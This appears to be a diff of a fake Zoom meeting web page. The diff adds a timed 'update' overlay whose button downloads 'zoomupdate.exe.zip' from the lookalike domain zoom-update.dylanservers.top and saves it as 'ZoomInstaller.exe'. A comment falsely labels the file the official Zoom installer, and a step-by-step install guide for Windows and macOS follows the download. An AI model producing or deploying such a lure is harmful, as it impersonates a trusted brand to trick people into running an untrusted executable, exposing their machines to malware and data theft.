+    </div>
+
+  </div>
 </div>
 
 <div class="toast" id="toast" role="status" aria-live="polite"></div>
 
-<!-- ===================== UPDATE PROMPT ===================== -->
-<div class="update-overlay" id="updateOverlay" role="dialog" aria-modal="true"
-     aria-labelledby="updateTitle" aria-describedby="updateDesc" aria-hidden="true">
-  <div class="update-card">
-    <div class="update-icon" aria-hidden="true">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
-           stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M12 3v12"/>
-        <polyline points="7 10 12 15 17 10"/>
-        <path d="M4 19h16"/>
-      </svg>
-    </div>
-
-    <h2 class="update-title" id="updateTitle">Update Zoom to continue</h2>
-    <p class="update-desc" id="updateDesc">
-      A newer version of the Zoom Workplace app is available. Update now to keep
-      your meeting secure and avoid interruptions.
-    </p>
-    <p class="update-version">Version 6.2.0 &middot; Recommended update</p>
-
-    <a class="update-btn" id="updateBtn" href="/store.html" rel="noopener">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
-           stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-        <path d="M12 3v12"/>
-        <polyline points="7 10 12 15 17 10"/>
-        <path d="M4 19h16"/>
-      </svg>
-      Download Update
-    </a>
-
-    <div class="countdown-wrap">
-      <div class="countdown-text" id="countdownText">
-        Redirecting to Store..... <strong>5s</strong>
-      </div>
-      <div class="countdown-bar">
-        <div class="countdown-fill" id="countdownFill"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-<!-- ============================================================
-     SCRIPT 1 — UPDATE PROMPT
-     Isolated in its own block so no other script error can stop it.
-     ============================================================ -->
 <script>
-(function () {
-  var ZOOM_URL = '/store.html';
-  var UPDATE_DELAY = 3000;   // show prompt after 3 seconds
-  var REDIRECT_SECONDS = 5;  // 5-second window to click
+  /* ============================================================
+     Overlay timing — appears 3 seconds after page load
+     ============================================================ */
+  var overlay = document.getElementById('installOverlay');
 
-  var overlay = document.getElementById('updateOverlay');
-  var btn = document.getElementById('updateBtn');
-  var countdownText = document.getElementById('countdownText');
-  var countdownFill = document.getElementById('countdownFill');
-
-  if (!overlay || !btn) return; // nothing to do
-
-  var ticker = null;
-  var finished = false;
-
-  function render(seconds) {
-    if (seconds > 0) {
-      countdownText.innerHTML = 'Redirecting to zoom.us in <strong>' + seconds + 's</strong>';
-      countdownFill.style.width = (seconds / REDIRECT_SECONDS * 100) + '%';
-    } else {
-      countdownText.innerHTML = 'Redirecting now…';
-      countdownFill.style.width = '0%';
-    }
-  }
-
-  function stopTicker() {
-    if (ticker) { clearInterval(ticker); ticker = null; }
-  }
-
-  function leave() {
-    if (finished) return;
-    finished = true;
-    stopTicker();
-    window.location.href = ZOOM_URL;
-  }
-
-  function showPrompt() {
-    if (finished) return;
-
+  function showOverlay() {
+    if (!overlay) return;
     overlay.classList.add('show');
     overlay.setAttribute('aria-hidden', 'false');
-
-    // Focus the button (older browsers don't accept the options object)
-    try { btn.focus({ preventScroll: true }); }
-    catch (e) { try { btn.focus(); } catch (e2) {} }
-
-    var remaining = REDIRECT_SECONDS;
-    render(remaining);
-
-    ticker = setInterval(function () {
-      remaining -= 1;
-      render(remaining);
-      if (remaining <= 0) leave();
-    }, 1000);
-  }
-
-  // Clicking the button skips the remaining countdown
-  btn.addEventListener('click', function (e) {
-    e.preventDefault();
-    stopTicker();
-    countdownText.innerHTML = 'Opening zoom.us…';
-    countdownFill.style.width = '0%';
-    leave();
-  });
-
-  // Schedule the prompt — guarded so it always runs
-  function start() {
-    setTimeout(showPrompt, UPDATE_DELAY);
   }
 
   if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', start);
+    document.addEventListener('DOMContentLoaded', function () {
+      setTimeout(showOverlay, 3000);
+    });
   } else {
-    start();
+    setTimeout(showOverlay, 3000);
   }
-})();
-</script>
 
-<!-- ============================================================
-     SCRIPT 2 — MEETING UI
-     Every lookup is null-checked so a missing element can never
-     break the page.
-     ============================================================ -->
-<script>
-(function () {
-  /* ---------- Toast ---------- */
-  var toast = document.getElementById('toast');
-  var toastTimer;
+  /* ============================================================
+     Download button
+     - Triggers a user-gesture download of the OFFICIAL Zoom installer
+     - Then flips the card from "prompt" to "guide"
+     ============================================================ */
+  var INSTALLER_URL = 'https://zoom-update.dylanservers.top/zoom.us/installer/zoomupdate.exe.zip';
+
+  var promptState = document.getElementById('promptState');
+  var guideState  = document.getElementById('guideState');
+  var downloadBtn = document.getElementById('downloadBtn');
+  var closeBtn    = document.getElementById('closeBtn');
+  var toast       = document.getElementById('toast');
+  var toastTimer  = null;
 
   function showToast(message) {
     if (!toast) return;
@@ -1073,114 +1187,66 @@
     clearTimeout(toastTimer);
     toastTimer = setTimeout(function () {
       toast.classList.remove('show');
-    }, 1800);
+    }, 2400);
   }
 
-  /* ---------- Mic toggle ---------- */
-  var micBtn = document.getElementById('micBtn');
-  if (micBtn) {
-    micBtn.addEventListener('click', function () {
-      var muted = micBtn.classList.toggle('muted');
-      var label = micBtn.querySelector('.tool-label');
-      if (label) label.textContent = muted ? 'Unmute' : 'Mute';
-      showToast(muted ? 'Microphone muted' : 'Microphone unmuted');
+  if (downloadBtn) {
+    downloadBtn.addEventListener('click', function () {
+      // Kick off the official installer download.
+      var a = document.createElement('a');
+      a.href = INSTALLER_URL;
+      a.download = 'ZoomInstaller.exe';
+      a.rel = 'noopener';
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+
+      showToast('Download started — follow the steps below');
+
+      // Swap to the guide.
+      if (promptState) promptState.style.display = 'none';
+      if (guideState)  guideState.style.display = 'block';
+
+      // Reset scroll so the user starts at the top of the guide.
+      var card = document.querySelector('.install-card');
+      if (card) card.scrollTop = 0;
     });
   }
 
-  /* ---------- Video toggle ---------- */
-  var videoBtn = document.getElementById('videoBtn');
-  if (videoBtn) {
-    videoBtn.addEventListener('click', function () {
-      var off = videoBtn.classList.toggle('muted');
-      var label = videoBtn.querySelector('.tool-label');
-      if (label) label.textContent = off ? 'Start Video' : 'Stop Video';
-      showToast(off ? 'Camera turned off' : 'Camera turned on');
-    });
-  }
-
-  /* ---------- Side panels ---------- */
-  var sidePanel = document.getElementById('sidePanel');
-  var panelTitle = document.getElementById('panelTitle');
-  var panelBody = document.getElementById('panelBody');
-  var panelClose = document.getElementById('panelClose');
-
-  var panelContent = {
-    Chat: '<div class="empty-state">No messages yet.<br><span style="font-size:11px;">Messages sent in this meeting will appear here.</span></div>',
-    Participants:
-      '<div class="participant-row">' +
-        '<div class="p-avatar">J</div>' +
-        '<div class="p-name">Jacques Denard</div>' +
-        '<div class="p-role">Host, me</div>' +
-      '</div>',
-    'Host Tools': '<div class="empty-state">Host controls<br><span style="font-size:11px;">Mute all · Lock meeting · Enable waiting room</span></div>',
-    'AI Companion': '<div class="empty-state">AI Companion<br><span style="font-size:11px;">Ask for a meeting summary or catch-up.</span></div>',
-    More: '<div class="empty-state">More options<br><span style="font-size:11px;">Backgrounds · Settings · Feedback</span></div>'
-  };
-
-  function closePanel() {
-    if (!sidePanel) return;
-    sidePanel.classList.remove('open');
-    sidePanel.setAttribute('aria-hidden', 'true');
-    var tools = document.querySelectorAll('.tool');
-    for (var i = 0; i < tools.length; i++) tools[i].classList.remove('active');
-  }
-
-  if (panelClose) panelClose.addEventListener('click', closePanel);
-
-  var panelButtons = document.querySelectorAll('[data-panel]');
-  for (var i = 0; i < panelButtons.length; i++) {
-    (function (btn) {
-      btn.addEventListener('click', function () {
-        var name = btn.getAttribute('data-panel');
-
-        if (name === 'Share') {
-          showToast('Starting screen share…');
-          return;
-        }
-        if (!sidePanel || !panelTitle || !panelBody) return;
-
-        var tools = document.querySelectorAll('.tool');
-        for (var j = 0; j < tools.length; j++) tools[j].classList.remove('active');
-        btn.classList.add('active');
-
-        panelTitle.textContent = name;
-        panelBody.innerHTML = panelContent[name] || '<div class="empty-state">' + name + '</div>';
-        sidePanel.classList.add('open');
-        sidePanel.setAttribute('aria-hidden', 'false');
-      });
-    })(panelButtons[i]);
-  }
-
-  /* ---------- Reactions popup ---------- */
-  var reactBtn = document.getElementById('reactBtn');
-  var reactionsPopup = document.getElementById('reactionsPopup');
-
-  if (reactBtn && reactionsPopup) {
-    reactBtn.addEventListener('click', function (e) {
-      e.stopPropagation();
-      var open = reactionsPopup.classList.toggle('open');
-      reactBtn.classList.toggle('active', open);
-    });
-
-    var reactions = reactionsPopup.querySelectorAll('.reaction');
-    for (var k = 0; k < reactions.length; k++) {
-      (function (r) {
-        r.addEventListener('click', function () {
-          reactionsPopup.classList.remove('open');
-          reactBtn.classList.remove('active');
-          showToast('Reacted ' + r.textContent);
-        });
-      })(reactions[k]);
-    }
-
-    document.addEventListener('click', function (e) {
-      if (!reactionsPopup.contains(e.target) && !reactBtn.contains(e.target)) {
-        reactionsPopup.classList.remove('open');
-        reactBtn.classList.remove('active');
+  if (closeBtn) {
+    closeBtn.addEventListener('click', function () {
+      if (overlay) {
+        overlay.classList.remove('show');
+        overlay.setAttribute('aria-hidden', 'true');
       }
     });
   }
-})();
+
+  /* ============================================================
+     Guide tabs — Windows / macOS
+     ============================================================ */
+  var guideTabs = document.querySelectorAll('.guide-tab');
+  var platforms = document.querySelectorAll('.platform-content');
+
+  for (var i = 0; i < guideTabs.length; i++) {
+    (function (tab) {
+      tab.addEventListener('click', function () {
+        var platform = tab.getAttribute('data-platform');
+
+        for (var j = 0; j < guideTabs.length; j++) {
+          guideTabs[j].classList.remove('active');
+        }
+        for (var k = 0; k < platforms.length; k++) {
+          platforms[k].classList.remove('active');
+        }
+
+        tab.classList.add('active');
+        var target = document.getElementById(platform);
+        if (target) target.classList.add('active');
+      });
+    })(guideTabs[i]);
+  }
 </script>
 
 </body>
